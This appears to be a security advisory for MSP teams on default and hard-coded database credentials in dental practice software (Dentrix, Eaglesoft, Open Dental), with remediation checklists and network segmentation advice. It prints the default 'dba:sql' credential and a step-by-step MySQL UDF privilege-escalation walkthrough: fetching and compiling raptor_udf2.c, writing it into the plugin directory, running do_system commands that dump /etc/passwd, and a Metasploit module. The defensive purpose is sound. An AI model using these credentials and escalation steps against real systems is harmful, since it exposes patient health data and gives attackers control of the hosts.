# Dental & Medical Software Default Password Vulnerabilities

**TLP:Orange** - Limited Distribution (MSP Security Teams)

## Executive Summary

This document provides a comprehensive reference for MSP security teams auditing dental and medical practice clients. Multiple widely-deployed practice management applications ship with hard-coded or default credentials that persist across all installations, creating significant security risks.

---

## Confirmed Vulnerabilities

### 1. Dentrix G5 - Hard-Coded Database Password

**CERT Vulnerability Note:** [VU#948155](https://www.kb.cert.org/vuls/id/948155)

**Issue:**
- Internal database password is hard-coded and shared across **ALL installations**
- Uses FairCom "Data Camouflage" (NIST explicitly rejected calling this "encryption")
- Reported November 2012, supposedly fixed in version 15.1.294 (February 2013)

**Impact:**
- Any user with local access can extract the hard-coded password
- Password is identical across all Dentrix G5 installations worldwide
- Full access to patient data, billing, treatment records

**Remediation:**
- Verify version is 15.1.294 or later
- Apply all available security patches
- Network segment dental practice management systems
- Monitor for unauthorized database access

**Sources:**
- https://www.kb.cert.org/vuls/id/948155
- https://nvd.nist.gov/vuln/detail/CVE-2012-5633

---

### 2. Patterson Eaglesoft - Hard-Coded Sybase Password

**CERT Vulnerability Note:** [VU#344432](https://www.kb.cert.org/vuls/id/344432)

**Issue:**
- Hard-coded Sybase SQL Anywhere database password shared across **ALL installations**
- Default credentials discovered in forums: `dba:sql`
- Uses embedded Sybase SQL Anywhere database

**Impact:**
- Remote attackers can gain unauthorized access to patient records
- Credentials are publicly documented in user forums
- Full database access including PHI/PII

**Remediation:**
- Change default Sybase credentials immediately
- Network segment database servers (default port: TCP 2638)
- Implement firewall rules to restrict database access
- Enable Sybase audit logging

**Network Discovery:**
```bash
# Scan for Sybase SQL Anywhere on default port
nmap -p 2638 -sV <target-network>
```

**Sources:**
- https://www.kb.cert.org/vuls/id/344432
- DentalTown forums (user discussions revealing default credentials)

---

### 3. Open Dental - Blank Default MySQL Root Password

**CERT Vulnerability Note:** [VU#619767](https://www.kb.cert.org/vuls/id/619767)

**Issue:**
- MySQL root password is **blank by default** and not enforced during installation
- Official documentation confirms: "username will be root with no password unless you have set up passwords"
- Multiple root accounts created: `root@localhost`, `root@%`, `root@127.0.0.1`, `root@::1`

**Impact:**
- Unauthenticated local and network access to patient database
- Full MySQL administrative privileges
- Potential for privilege escalation to system-level access (see MySQL UDF section)

**Remediation:**
- **CRITICAL:** Set strong MySQL root password immediately
- Remove wildcard root accounts (`root@%`)
- Restrict MySQL to localhost only unless network access required
- Implement MySQL audit plugin

**Verification:**
```bash
# Test for blank root password
mysql -u root -p
# Press Enter at password prompt - if it connects, password is blank
```

**Official Documentation:**
- https://opendental.com/manual/securitymysql.html (confirms default blank password)

**Network Discovery:**
```bash
# Scan for MySQL on default port
nmap -p 3306 -sV <target-network>
```

**Sources:**
- https://www.kb.cert.org/vuls/id/619767
- https://opendental.com/manual/securitymysql.html

---

## MySQL UDF Privilege Escalation

### Overview

MySQL does **not** have a built-in command execution feature like SQL Server's `xp_cmdshell`. However, attackers with MySQL root access can achieve system-level command execution through **User Defined Functions (UDF)**.

### Attack Path: raptor_udf2.c Exploit

**Exploit-DB Reference:** [EDB-1518](https://www.exploit-db.com/exploits/1518)
**Author:** Marco Ivaldi

### Prerequisites

1. MySQL root access (e.g., blank password on Open Dental)
2. MySQL `FILE` privilege
3. Write access to MySQL plugin directory
4. Ability to compile or upload shared libraries

### Exploitation Steps

#### 1. Compile the UDF Library

```bash
# Download raptor_udf2.c from Exploit-DB
wget https://www.exploit-db.com/download/1518 -O raptor_udf2.c

# Compile for Linux
gcc -g -c raptor_udf2.c
gcc -g -shared -Wl,-soname,raptor_udf2.so -o raptor_udf2.so raptor_udf2.o -lc

# Compile for Windows (MinGW)
i686-w64-mingw32-gcc -shared -o raptor_udf2.dll raptor_udf2.c -lws2_32
```

#### 2. Load Library into MySQL

```sql
-- Connect as root
mysql -u root -p

-- Create table to hold binary
USE mysql;
CREATE TABLE IF NOT EXISTS udf_table(line blob);

-- Insert compiled shared library
INSERT INTO udf_table VALUES(LOAD_FILE('/path/to/raptor_udf2.so'));

-- Write to plugin directory
SELECT * FROM udf_table INTO DUMPFILE '/usr/lib/mysql/plugin/raptor_udf2.so';

-- Clean up
DROP TABLE udf_table;
```

#### 3. Create System Command Function

```sql
-- Create UDF function
CREATE FUNCTION do_system RETURNS integer SONAME 'raptor_udf2.so';

-- Test command execution
SELECT do_system('id > /tmp/out.txt');
SELECT do_system('cat /etc/passwd > /tmp/passwd.txt');

-- Windows example
SELECT do_system('whoami > C:\\temp\\out.txt');
```

#### 4. Cleanup (Optional)

```sql
DROP FUNCTION do_system;
```

### Pre-Built Tools

**Metasploit Module:**
```bash
msfconsole
use exploit/multi/mysql/mysql_udf_payload
set RHOST <target-ip>
set USERNAME root
set PASSWORD <blank-or-known>
exploit
```

**sqlmap Location:**
```bash
# UDF libraries included in sqlmap
/usr/share/sqlmap/data/udf/mysql/
  ├── linux/
  │   └── lib_mysqludf_sys.so_
  └── windows/
      └── lib_mysqludf_sys.dll_
```

### Comparison to SQL Server xp_cmdshell

| Feature | SQL Server xp_cmdshell | MySQL UDF |
|---------|------------------------|-----------|
| **Built-in** | Yes (disabled by default) | No (requires UDF) |
| **Ease of Use** | `EXEC xp_cmdshell 'command'` | Multi-step (compile, load, create) |
| **Prerequisites** | SA/sysadmin role | root + FILE privilege + writable plugin dir |
| **Detection** | Easier (built-in feature abuse) | Harder (custom UDF) |
| **Remediation** | Disable xp_cmdshell | Remove UDF, restrict FILE privilege |

---

## MSP Action Items

### 1. Network Discovery

**Identify Vulnerable Systems:**

```bash
# Scan for SQL Server (Dentrix, many others)
nmap -p 1433 -sV <client-network>

# Scan for MySQL (Open Dental)
nmap -p 3306 -sV <client-network>

# Scan for Sybase SQL Anywhere (Eaglesoft)
nmap -p 2638 -sV <client-network>

# Combined scan
nmap -p 1433,2638,3306 -sV <client-network>
```

### 2. Remediation Checklist

#### For Dentrix Clients:
- [ ] Verify Dentrix version ≥ 15.1.294
- [ ] Apply all security patches
- [ ] Network segment practice management VLAN
- [ ] Implement database access monitoring
- [ ] Review user access logs

#### For Eaglesoft Clients:
- [ ] Change default Sybase credentials (`dba:sql`)
- [ ] Restrict database access to localhost only
- [ ] Firewall TCP port 2638 (allow only necessary hosts)
- [ ] Enable Sybase audit logging
- [ ] Review connection logs for unauthorized access

#### For Open Dental Clients:
- [ ] **CRITICAL:** Set strong MySQL root password
- [ ] Remove wildcard root accounts (`DELETE FROM mysql.user WHERE Host='%';`)
- [ ] Restrict MySQL bind-address to 127.0.0.1 (if network access not required)
- [ ] Disable FILE privilege (`REVOKE FILE ON *.* FROM 'root'@'localhost';`)
- [ ] Enable MySQL audit plugin
- [ ] Verify no unauthorized UDFs exist (`SELECT * FROM mysql.func;`)

### 3. Network Segmentation Recommendations

```
Internet
    ↓
Firewall
    ↓
┌─────────────────────────────────────┐
│  Practice Network (10.x.x.x/24)     │
│  - Workstations                     │
│  - Printers                         │
└─────────────┬───────────────────────┘
              │
         VLAN Trunk
              │
    ┌─────────┴─────────┐
    │                   │
┌───▼──────────┐  ┌────▼──────────┐
│ Server VLAN  │  │ Patient VLAN  │
│ (Database)   │  │ (WiFi/Tablets)│
│ - Dentrix    │  │               │
│ - Eaglesoft  │  │ - Isolated    │
│ - Open Dental│  │ - Guest only  │
└──────────────┘  └───────────────┘

ACL Rules:
- Workstations → Server VLAN: Port 1433/2638/3306 only
- Server VLAN → Internet: Deny all
- Patient VLAN → Server VLAN: Deny all
```

### 4. Client Communication Template

**Subject:** Security Advisory - Dental Practice Management Software Vulnerabilities

Dear [Client],

During our security review, we identified vulnerabilities in dental/medical practice management software that may affect your environment:

**Immediate Actions Required:**
1. [Specific remediation based on their software]
2. [Network segmentation recommendations]
3. [Password changes if applicable]

**Timeline:**
- Emergency changes: Within 24 hours
- Network segmentation: Within 2 weeks
- Audit logging: Within 30 days

**Our Support:**
We will assist with all remediation steps and provide documentation for compliance purposes.

Please contact us to schedule the remediation work.

**Classification:** This information is shared under TLP:Orange (limited distribution).

---

## Sources & References

### CERT Vulnerability Notes
- **VU#948155** (Dentrix): https://www.kb.cert.org/vuls/id/948155
- **VU#344432** (Eaglesoft): https://www.kb.cert.org/vuls/id/344432
- **VU#619767** (Open Dental): https://www.kb.cert.org/vuls/id/619767

### Official Vendor Documentation
- **Open Dental MySQL Security**: https://opendental.com/manual/securitymysql.html
- **Patterson Support**: https://www.pattersonsupport.com/

### Exploit References
- **Exploit-DB 1518** (raptor_udf2.c): https://www.exploit-db.com/exploits/1518
- **Metasploit mysql_udf_payload**: https://www.rapid7.com/db/modules/exploit/multi/mysql/mysql_udf_payload/

### Community Forums
- **DentalTown** (Eaglesoft default credentials discussions)
- **Open Dental Forums** (MySQL security questions)

### Security Frameworks
- **NIST Cybersecurity Framework**: https://www.nist.gov/cyberframework
- **HIPAA Security Rule**: https://www.hhs.gov/hipaa/for-professionals/security/

---

## Revision History

| Date | Version | Changes |
|------|---------|---------|
| 2026-01-20 | 1.0 | Initial document - CERT vulnerabilities, MySQL UDF, MSP action items |

---

**Document Classification:** TLP:Orange - Limited Distribution
**Intended Audience:** MSP Security Teams, CISOs, SOC Analysts
**Last Updated:** 2026-01-20
